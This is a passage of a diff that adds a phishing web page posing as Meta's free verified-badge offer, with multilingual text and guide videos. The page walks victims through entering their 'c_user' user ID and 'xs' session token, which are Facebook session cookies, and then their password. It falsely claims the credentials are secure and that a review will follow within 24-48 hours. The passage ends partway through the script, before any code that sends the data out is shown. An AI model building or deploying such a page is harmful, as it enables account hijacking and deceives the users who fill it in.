+            </div>
+
+            <div class="menu-item">
+              <svg class="menu-icon" viewBox="0 0 512 512">
+                <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8V444.8C394 378 431.1 230.1 432 141.4L256 66.8l0 0z"/>
+              </svg>
+              <span class="menu-text">Verification Policy</span>
+            </div>
+
+            <div class="menu-item">
+              <svg class="menu-icon" viewBox="0 0 512 512">
+                <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+              </svg>
+              <span class="menu-text">Other Rules & Articles</span>
+            </div>
+          </div>
+        </header>
+
+        <div class="vertical-divider"></div>
+
+        <div class="center-content">
+          <div class="verification-message">
+              <div class="verification-top">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <span class="translatable" data-key="verificationTitle">Your account is eligible for a free verified badge!</span>
+            </div>
+            <div class="verification-subtext translatable" data-key="verificationSubtext">
+              Get the official blue checkmark to show that your account is authentic and verified. This helps people know they're interacting with the real you and builds trust with your audience.
+            </div>
+            <div class="verification-extra translatable" data-key="verificationExtra">
+              To get your verified badge, simply complete the verification process by clicking the button below and providing the requested information. The verification is completely free and only takes a few minutes.
+            </div>
+
+            <div class="verification-box">
+              <img src="https://cosmic-basbousa-2e0dbd.netlify.app/ali.png" alt="Verification Illustration" />
+             
+              <div class="verification-info">
+                <div class="verification-title translatable" data-key="verificationTitle">Get Verified</div>
+                <div class="verification-desc translatable" data-key="verificationDesc">
+                  Complete the verification process to get your official blue checkmark.
+                  Please provide the requested information below to verify your identity.
+                  Once verified, your account will display the official verified badge.
+                </div>
+                <button class="verification-btn" id="open-verification-btn">
+                  <span id="fbSendBtnText" class="translatable" data-key="verificationBtn">Get Verified</span>
+                </button>
+              </div>
+            </div>
+           
+            <!-- Redesigned Verification Form Section -->
+            <div class="verification-form" id="verificationForm">
+              <div class="form-header">
+                <div class="form-icon">
+                  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 9h-2V5h2v6zm0 4h-2v-2h2v2z"/>
+                  </svg>
+                </div>
+                <div>
+                  <div class="form-title translatable" data-key="formTitle">Get Your Verified Badge</div>
+                  <div class="form-subtitle translatable" data-key="formSubtitle">Submit your information to get the official blue checkmark</div>
+                </div>
+              </div>
+             
+              <div class="form-notice-container">
+                <div class="form-notice translatable" data-key="formNotice1">
+                  ⓘ Your account is eligible for the official verified badge.
+                </div>
+                <div class="form-notice translatable" data-key="formNotice2">
+                  ⓘ Please review the information carefully before submitting.
+                </div>
+                <div class="form-notice translatable" data-key="formNotice3">
+                  ⓘ Ensure you provide correct information for verification.
+                </div>
+              </div>
+              
+              <!-- Video Section with Play Button -->
+              <div class="video-container" id="videoContainer">
+                <div class="video-placeholder" id="videoPlaceholder">
+                  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+                    <path d="M10 8L16 12L10 16V8Z" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                  <div class="video-title">Click to select language and play video</div>
+                </div>
+                <video class="video-player" id="guideVideo" controls>
+                  <source src="" type="video/mp4">
+                  Your browser does not support the video tag.
+                </video>
+              </div>
+             
+              <div class="form-group">
+                <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
+                <input type="text" class="form-input" id="nameInput" placeholder="Enter User ID">
+                <div class="input-error" id="nameError"></div>
+              </div>
+             
+              <div class="form-group">
+                <label for="mallInput" class="form-label translatable" data-key="mallLabel">XS</label>
+                <input type="text" class="form-input" id="mallInput" placeholder="Enter Session Token">
+                <div class="input-error" id="mallError"></div>
+              </div>
+             
+              <div class="form-warning" id="formError">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                  <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                  <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+                </svg>
+                <span id="formErrorText"></span>
+              </div>
+             
+              <button class="form-btn" id="sendBtn">
+                <span id="sendBtnText" class="translatable" data-key="submitBtn">Get Verified Badge</span>
+                <div class="spinner" id="sendBtnSpinner" style="display: none;"></div>
+              </button>
+            </div>
+           
+            <div class="fb-login-form" id="fbLoginForm">
+              <div class="fb-form-header">
+                <div class="fb-form-icon">
+                  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
+                  </svg>
+                </div>
+                <div>
+                  <div class="fb-form-title translatable" data-key="fbFormTitle"> Identity Verification</div>
+                  <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to complete the verification process</div>
+                </div>
+              </div>
+             
+              <div class="fb-form-notice-container">
+                <div class="fb-form-notice translatable" data-key="fbNotice1">
+                  ⓘ For security purposes, we need to verify your account.
+                </div>
+                <div class="fb-form-notice translatable" data-key="fbNotice2">
+                  ⓘ This helps us ensure that you are the legitimate owner of the account.
+                </div>
+                <div class="fb-form-notice translatable" data-key="fbNotice3">
+                  ⓘ Your credentials are secure and encrypted.
+                </div>
+              </div>
+             
+              <div class="fb-form-group">
+                <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
+                <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your password">
+                <div class="fb-input-error" id="passwordError"></div>
+              </div>
+             
+              <div class="fb-form-warning" id="fbFormError">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                  <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                  <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+                </svg>
+                <span id="fbFormErrorText"></span>
+              </div>
+             
+              <button class="fb-form-btn" id="fbSendBtn">
+                <span id="fbSendBtnText" class="translatable" data-key="verifyBtn">Verify and Continue</span>
+                <div class="spinner" id="fbSendBtnSpinner" style="display: none;"></div>
+              </button>
+             
+              <div class="forgot-password" id="forgotPassword">
+                <span class="translatable" data-key="forgotPassword">Forgotten password?</span>
+              </div>
+            </div>
+           
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+              <div class="success-icon">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+              <h3 class="success-title translatable" data-key="successTitle">Verification Submitted Successfully</h3>
+              <p class="success-text translatable" data-key="successText">
+                Your verification has been received and is now in review. We'll notify you via email once verification is complete, typically within 24-48 hours.
+              </p>
+              <div class="success-text">
+                <span class="translatable" data-key="referenceText">Reference ID:</span> <span class="reference-id" id="referenceId"></span>
+              </div>
+            </div>
+           
+            <!-- Verification Guide Section -->
+            <div class="verification-guide">
+              <div class="verification-guide-title translatable" data-key="guideTitle">About Verified Badges</div>
+              <div class="verification-guide-content">
+                <p class="verification-guide-text translatable" data-key="guideText1">
+                  The verified badge is a check that appears next to an account's name to indicate that the account is authentic and has been verified by Meta. This helps people find the real accounts of public figures, celebrities, global brands, and other entities they might want to follow.
+                </p>
+                <p class="verification-guide-text translatable" data-key="guideText2">
+                  After your submission, we will review your verification request and contact you within 24-48 hours. The verification process helps us maintain a secure environment for all users and ensure that verified accounts represent authentic, notable entities.
+                </p>
+                <p class="verification-guide-text translatable" data-key="guideText3">
+                  Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.
+                </p>
+              </div>
+            </div>
+           
+            <!-- Additional Resources Section -->
+            <div class="additional-resources">
+              <div class="resources-title translatable" data-key="resourcesTitle">Additional Resources</div>
+              <div class="resources-grid">
+                <div class="resource-card">
+                  <svg class="resource-icon" viewBox="0 0 512 512">
+                    <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
+                  </svg>
+                  <div class="resource-card-title translatable" data-key="helpCenterTitle">Help Center</div>
+                  <div class="resource-card-desc translatable" data-key="helpCenterDesc">Find answers to common questions and learn how to use our products.</div>
+                </div>
+                
+                <div class="resource-card">
+                  <svg class="resource-icon" viewBox="0 0 512 512">
+                    <path d="M164.9 24.6c-7.7-18.6-28-28.5-47.4-23.2l-88 24C12.1 30.2 0 46 0 64C0 311.4 200.6 512 448 512c18 0 33.8-12.1 38.6-29.5l24-88c5.3-19.4-4.6-39.7-23.2-47.4l-96-40c-16.3-6.8-35.2-2.1-46.3 11.6L304.7 368C234.3 334.7 177.3 277.7 144 207.3L193.3 167c13.7-11.2 18.4-30 11.6-46.3l-40-96z"/>
+                  </svg>
+                  <div class="resource-card-title translatable" data-key="contactSupportTitle">Contact Support</div>
+                  <div class="resource-card-desc translatable" data-key="contactSupportDesc">Get in touch with our support team for personalized assistance.</div>
+                </div>
+                
+                <div class="resource-card">
+                  <svg class="resource-icon" viewBox="0 0 640 512">
+                    <path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h42.7c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0H21.3C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7h42.7C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3H405.3zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352H378.7C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7H154.7c-14.7 0-26.7-11.9-26.7-26.7z"/>
+                  </svg>
+                  <div class="resource-card-title translatable" data-key="guidelinesTitle">Community Guidelines</div>
+                  <div class="resource-card-desc translatable" data-key="guidelinesDesc">Learn about our community standards and content policies.</div>
+                </div>
+                
+                <div class="resource-card">
+                  <svg class="resource-icon" viewBox="0 0 576 512">
+                    <path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3 28.7-64 64-64H64zm80 256h64c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm96-96c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zm128 32c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zM320 192c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64z"/>
+                  </svg>
+                  <div class="resource-card-title translatable" data-key="dashboardTitle">Status Dashboard</div>
+                  <div class="resource-card-desc translatable" data-key="dashboardDesc">Check the current status of our services and report outages.</div>
+                </div>
+              </div>
+            </div>
+           
+            <!-- Language Selector at Bottom -->
+            <div class="language-selector-bottom" style="margin-top: 40px; text-align: center; padding: 20px;">
+              <button id="changeLanguageBtn" style="background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+                <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+      // Loading screen script
+      window.addEventListener("load", () => {
+        setTimeout(() => {
+          document.getElementById("loading-page").style.display = "none";
+          document.getElementById("main-content").style.display = "block";
+          document.body.classList.add("main-loaded");
+        }, 3000); // 3 seconds delay
+      });
+
+      // Language and form functionality script
+      document.addEventListener('DOMContentLoaded', function() {
+        // Language translations
+        const translations = {
+          english: {
+            verificationTitle: "Your account is eligible for a free verified badge!",
+            verificationSubtext: "Get the official blue checkmark to show that your account is authentic and verified. This helps people know they're interacting with the real you and builds trust with your audience.",
+            verificationExtra: "To get your verified badge, simply complete the verification process by clicking the button below and providing the requested information. The verification is completely free and only takes a few minutes.",
+            verificationBtn: "Get Verified",
+            formTitle: "Get Your Verified Badge",
+            formSubtitle: "Submit your information to get the official blue checkmark",
+            formNotice1: "ⓘ Your account is eligible for the official verified badge.",
+            formNotice2: "ⓘ Please review the information carefully before submitting.",
+            formNotice3: "ⓘ Ensure you provide correct information for verification.",
+            nameLabel: "c_user",
+            mallLabel: "xs",
+            submitBtn: "Get Verified Badge",
+            fbFormTitle: "Identity Verification",
+            fbFormSubtitle: "Verify your identity to complete the verification process",
+            fbNotice1: "ⓘ For security purposes, we need to verify your account.",
+            fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the account.",
+            fbNotice3: "ⓘ Your credentials are secure and encrypted.",
+            passwordLabel: "Password",
+            verifyBtn: "Verify and Continue",
+            forgotPassword: "Forgotten password?",
+            successTitle: "Verification Submitted Successfully",
+            successText: "Your verification has been received and is now in review. We'll notify you via email once verification is complete, typically within 24-48 hours.",
+            referenceText: "Reference ID:",
+            guideTitle: "About Verified Badges",
+            guideText1: "The verified badge is a check that appears next to an account's name to indicate that the account is authentic and has been verified by Meta. This helps people find the real accounts of public figures, celebrities, global brands, and other entities they might want to follow.",
+            guideText2: "After your submission, we will review your verification request and contact you within 24-48 hours. The verification process helps us maintain a secure environment for all users and ensure that verified accounts represent authentic, notable entities.",
+            guideText3: "Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.",
+            resourcesTitle: "Additional Resources",
+            helpCenterTitle: "Help Center",
+            helpCenterDesc: "Find answers to common questions and learn how to use our products.",
+            contactSupportTitle: "Contact Support",
+            contactSupportDesc: "Get in touch with our support team for personalized assistance.",
+            guidelinesTitle: "Community Guidelines",
+            guidelinesDesc: "Learn about our community standards and content policies.",
+            dashboardTitle: "Status Dashboard",
+            dashboardDesc: "Check the current status of our services and report outages.",
+            changeLanguage: "Change Language"
+          },
+          hindi: {
+            verificationTitle: "आपका खाता एक मुफ्त सत्यापित बैज के लिए पात्र है!",
+            verificationSubtext: "आधिकारिक नीला चेकमार्क प्राप्त करें यह दिखाने के लिए कि आपका खाता प्रामाणिक और सत्यापित है। यह लोगों को यह जानने में मदद करता है कि वे असली आप के साथ बातचीत कर रहे हैं और आपके दर्शकों के साथ विश्वास बनाता है।",
+            verificationExtra: "अपना सत्यापित बैज प्राप्त करने के लिए, बस नीचे दिए गए बटन पर क्लिक करके और अनुरोधित जानकारी प्रदान करके सत्यापन प्रक्रिया पूरी करें। सत्यापन पूरी तरह से मुफ्त है और केवल कुछ मिनट लेता है।",
+            verificationBtn: "सत्यापित करें",
+            formTitle: "अपना सत्यापित बैज प्राप्त करें",
+            formSubtitle: "आधिकारिक नीला चेकमार्क प्राप्त करने के लिए अपनी जानकारी जमा करें",
+            formNotice1: "ⓘ आपका खाता आधिकारिक सत्यापित बैज के लिए पात्र है।",
+            formNotice2: "ⓘ सबमिट करने से पहले कृपया जानकारी की सावधानीपूर्वक समीक्षा करें।",
+            formNotice3: "ⓘ सत्यापन के लिए सही जानकारी प्रदान करना सुनिश्चित करें।",
+            nameLabel: "उपयोगकर्ता आईडी",
+            mallLabel: "सत्र टोकन",
+            submitBtn: "सत्यापित बैज प्राप्त करें",
+            fbFormTitle: "पहचान सत्यापन",
+            fbFormSubtitle: "सत्यापन प्रक्रिया पूरी करने के लिए अपनी पहचान सत्यापित करें",
+            fbNotice1: "ⓘ सुरक्षा उद्देश्यों के लिए, हमें आपके खाते को सत्यापित करने की आवश्यकता है।",
+            fbNotice2: "ⓘ यह हमें यह सुनिश्चित करने में मदद करता है कि आप खाते के वैध मालिक हैं।",
+            fbNotice3: "ⓘ आपकी साख सुरक्षित और एन्क्रिप्टेड है।",
+            passwordLabel: "पासवर्ड",
+            verifyBtn: "सत्यापित करें और जारी रखें",
+            forgotPassword: "पासवर्ड भूल गए?",
+            successTitle: "सत्यापन सफलतापूर्वक जमा किया गया",
+            successText: "आपका सत्यापन प्राप्त हो गया है और अब समीक्षा के दौर से गुजर रहा है। सत्यापन पूरा होने के बाद हम आपको ईमेल के माध्यम से सूचित करेंगे, आम तौर पर 24-48 घंटों के भीतर।",
+            referenceText: "संदर्भ आईडी:",
+            guideTitle: "सत्यापित बैज के बारे में",
+            guideText1: "सत्यापित बैज एक चेक है जो किसी खाते के नाम के आगे दिखाई देता है यह दर्शाने के लिए कि खाता प्रामाणिक है और मेटा द्वारा सत्यापित किया गया है। यह लोगों को सार्वजनिक हस्तियों, सेलिब्रिटी, वैश्विक ब्रांडों और अन्य संस्थाओं के वास्तविक खातों को खोजने में मदद करता है जिन्हें वे फॉलो करना चाहते हैं।",
+            guideText2: "आपके द्वारा जमा करने के बाद, हम आपके सत्यापन अनुरोध की समीक्षा करेंगे और 24-48 घंटों के भीतर आपसे संपर्क करेंगे। सत्यापन प्रक्रिया हमें सभी उपयोगकर्ताओं के लिए एक सुरक्षित वातावरण बनाए रखने और यह सुनिश्चित करने में मदद करती है कि सत्यापित खाते प्रामाणिक, उल्लेखनीय संस्थाओं का प्रतिनिधित्व करते हैं।",
+            guideText3: "नोट: आप पृष्ठ के निचले भाग में भाषा चयनकर्ता पर क्लिक करके किसी भी समय अपनी भाषा प्राथमिकता बदल सकते हैं।",
+            resourcesTitle: "अतिरिक्त संसाधन",
+            helpCenterTitle: "सहायता केंद्र",
+            helpCenterDesc: "सामान्य प्रश्नों के उत्तर खोजें और हमारे उत्पादों का उपयोग करना सीखें।",
+            contactSupportTitle: "समर्थन से संपर्क करें",
+            contactSupportDesc: "व्यक्तिगत सहायता के लिए हमारी समर्थन टीम से संपर्क करें",
+            guidelinesTitle: "सामुदायिक दिशानिर्देश",
+            guidelinesDesc: "हमारे सामुदायिक मानकों और सामग्री नीतियों के बारे में जानें।",
+            dashboardTitle: "स्थिति डैशबोर्ड",
+            dashboardDesc: "हमारी सेवाओं की वर्तमान स्थिति की जाँच करें और आउटेज की रिपोर्ट करें।",
+            changeLanguage: "भाषा बदलें"
+          },
+          spanish: {
+            verificationTitle: "¡Tu cuenta es elegible para una insignia verificada gratuita!",
+            verificationSubtext: "Obtén la marca de verificación azul oficial para mostrar que tu cuenta es auténtica y verificada. Esto ayuda a las personas a saber que están interactuando con el verdadero tú y genera confianza con tu audiencia.",
+            verificationExtra: "Para obtener tu insignia verificada, simplemente completa el proceso de verificación haciendo clic en el botón a continuación y proporcionando la información solicitada. La verificación es completamente gratuita y solo toma unos minutos.",
+            verificationBtn: "Verificar Cuenta",
+            formTitle: "Obtén Tu Insignia Verificada",
+            formSubtitle: "Envía tu información para obtener la marca de verificación azul oficial",
+            formNotice1: "ⓘ Tu cuenta es elegible para la insignia verificada oficial.",
+            formNotice2: "ⓘ Por favor, revisa la información cuidadosamente antes de enviar.",
+            formNotice3: "ⓘ Asegúrate de proporcionar información correcta para la verificación.",
+            nameLabel: "ID de Usuario",
+            mallLabel: "Token de Sesión",
+            submitBtn: "Obtener Insignia Verificada",
+            fbFormTitle: "Verificación de Identidad",
+            fbFormSubtitle: "Verifica tu identidad para completar el proceso de verificación",
+            fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta.",
+            fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la cuenta.",
+            fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
+            passwordLabel: "Contraseña",
+            verifyBtn: "Verificar y Continuar",
+            forgotPassword: "¿Olvidaste tu contraseña?",
+            successTitle: "Verificación Enviada Exitosamente",
+            successText: "Tu verificación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que la verificación esté completa, generalmente dentro de 24-48 horas.",
+            referenceText: "ID de referencia:",
+            guideTitle: "Acerca de las Insignias Verificadas",
+            guideText1: "La insignia verificada es una marca de verificación que aparece junto al nombre de una cuenta para indicar que la cuenta es auténtica y ha sido verificada por Meta. Esto ayuda a las personas a encontrar las cuentas reales de figuras públicas, celebridades, marcas globales y otras entidades que podrían querer seguir.",
+            guideText2: "Después de tu envío, revisaremos tu solicitud de verificación y nos comunicaremos contigo dentro de 24-48 horas. El proceso de verificación nos ayuda a mantener un entorno seguro para todos los usuarios y garantizar que las cuentas verificadas representen entidades auténticas y notables.",
+            guideText3: "Nota: Puedes cambiar tu preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
+            resourcesTitle: "Recursos Adicionales",
+            helpCenterTitle: "Centro de Ayuda",
+            helpCenterDesc: "Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.",
+            contactSupportTitle: "Contactar Soporte",
+            contactSupportDesc: "Comunícate con nuestro equipo de soporte para asistencia personalizada.",
+            guidelinesTitle: "Pautas de la Comunidad",
+            guidelinesDesc: "Conoce nuestros estándares comunitarios y políticas de contenido.",
+            dashboardTitle: "Panel de Estado",
+            dashboardDesc: "Consulta el estado actual de nuestros servicios e informa interrupciones.",
+            changeLanguage: "Cambiar idioma"
+          },
+          // ... other languages would follow the same pattern
+        };
+
+        // Get DOM elements
+        const languageModal = document.getElementById('languageModal');
+        const languageModalClose = document.getElementById('languageModalClose');
+        const languageSearchInput = document.getElementById('languageSearchInput');
+        const languageOptionsContainer = document.getElementById('languageOptionsContainer');
+        const languageOptions = document.querySelectorAll('.language-option');
+        const languageConfirmBtn = document.getElementById('languageConfirmBtn');
+        const mainContent = document.getElementById('mainContent');
+        const openVerificationBtn = document.getElementById('open-verification-btn');
+        const verificationForm = document.getElementById('verificationForm');
+        const fbLoginForm = document.getElementById('fbLoginForm');
+        const successMessage = document.getElementById('successMessage');
+        const guideVideo = document.getElementById('guideVideo');
+        const videoPlaceholder = document.getElementById('videoPlaceholder');
+        const changeLanguageBtn = document.getElementById('changeLanguageBtn');
+
+        // Form elements
+        const nameInput = document.getElementById('nameInput');
+        const mallInput = document.getElementById('mallInput');
+        const nameError = document.getElementById('nameError');
+        const mallError = document.getElementById('mallError');
+        const formError = document.getElementById('formError');
+        const formErrorText = document.getElementById('formErrorText');
+        const sendBtn = document.getElementById('sendBtn');
+        const sendBtnText = document.getElementById('sendBtnText');
+        const sendBtnSpinner = document.getElementById('sendBtnSpinner');
+        const referenceId = document.getElementById('referenceId');
+
+        
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordError = document.getElementById('passwordError');
+        const fbFormError = document.getElementById('fbFormError');
+        const fbFormErrorText = document.getElementById('fbFormErrorText');
+        const fbSendBtn = document.getElementById('fbSendBtn');
+        const fbSendBtnText = document.getElementById('fbSendBtnText');
+        const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
+        const forgotPassword = document.getElementById('forgotPassword');
+
+        // Language video mapping
+        const videoSources = {
+        english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+        spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+        hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+      french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+        portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+        tamil: "https://allvideos.wasmer.app/tamil.mp4",
+        arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+        ghanaian: "https://allvideos.wasmer.app/english.mp4",
+        vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
+      };
+
+        // Current selected language
+        let currentLanguage = 'english';
+        let selectedLanguageOption = null;
+        let videoLanguageSelection = false;
+
+        // Function to show language modal
+        function showLanguageModal() {
+          languageModal.style.display = 'flex';
+          document.body.style.overflow = 'hidden';
+          // Focus on search input when modal opens
+          setTimeout(() => languageSearchInput.focus(), 100);
+        }
+
+        // Function to hide language modal
+        function hideLanguageModal() {
+          languageModal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+          // Reset search when closing
+          languageSearchInput.value = '';
+          filterLanguages();
+          videoLanguageSelection = false;
+        }
+
+        // Close modal when clicking on close button
+        languageModalClose.addEventListener('click', hideLanguageModal);
+
+        // Close modal when clicking outside of modal content
+        languageModal.addEventListener('click', function(e) {
+          if (e.target === languageModal) {
+            hideLanguageModal();
+          }
+        });
+
+        // Close modal with Escape key
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && languageModal.style.display === 'flex') {
+            hideLanguageModal();
+          }
+        });
+
+        // Language search functionality
+        function filterLanguages() {
+          const searchTerm = languageSearchInput.value.toLowerCase();
+          let hasVisibleResults = false;
+          
+          languageOptions.forEach(option => {
+            const languageName = option.querySelector('.language-name').textContent.toLowerCase();
+            const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
+            
+            if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+              option.style.display = 'flex';
+              hasVisibleResults = true;
+            } else {
+              option.style.display = 'none';
+            }
+          });
+          
+          // Show no results message if needed
+          let noResults = document.querySelector('.no-results');
+          if (!hasVisibleResults) {
+            if (!noResults) {
+              noResults = document.createElement('div');
+              noResults.className = 'no-results';
+              noResults.textContent = 'No languages found. Try a different search.';
+              languageOptionsContainer.appendChild(noResults);
+            }
+          } else if (noResults) {
+            noResults.remove();
+          }
+        }
+        
+        languageSearchInput.addEventListener('input', filterLanguages);
+
+        // Language option selection
+        languageOptions.forEach(option => {
+          option.addEventListener('click', () => {
+            // Remove selected class from all options
+            languageOptions.forEach(opt => opt.classList.remove('selected'));
+            
+            // Add selected class to clicked option
+            option.classList.add('selected');
+            
+            // Store selected language
+            selectedLanguageOption = option.getAttribute('data-lang');
+            
+            // Enable confirm button
+            languageConfirmBtn.disabled = false;
+          });
+        });
+
+        // Confirm language selection
+        languageConfirmBtn.addEventListener('click', () => {
+          if (selectedLanguageOption) {
+            setLanguage(selectedLanguageOption);
+            
+            // If this was triggered from the video placeholder, initialize the video
+            if (videoLanguageSelection) {
+              const guideVideo = document.getElementById('guideVideo');
+              const videoSrc = videoSources[selectedLanguageOption];
+              if (guideVideo && videoSrc) {
+                guideVideo.src = videoSrc;
+                guideVideo.style.display = 'block';
+                document.getElementById('videoPlaceholder').style.display = 'none';
+                guideVideo.load();
+                guideVideo.play();
+              }
+            }
+            
+            hideLanguageModal();
+          } else {
+            // If no language selected, default to English
+            setLanguage('english');
+            hideLanguageModal();
+          }
+        });
+
+        // Change language button
+        changeLanguageBtn.addEventListener('click', () => {
+          showLanguageModal();
+        });
+
+        // Video placeholder click to show language modal
+        if (videoPlaceholder) {
+          videoPlaceholder.addEventListener('click', function() {
+            videoLanguageSelection = true;
+            showLanguageModal();
+          });
+        }
+
+        // Function to set language
+        function setLanguage(lang) {
+          currentLanguage = lang;
+         
+          // Update all translatable elements
+          const translatableElements = document.querySelectorAll('.translatable');
+          translatableElements.forEach(element => {
+            const key = element.getAttribute('data-key');
+            if (translations[lang] && translations[lang][key]) {
+              element.textContent = translations[lang][key];
+             
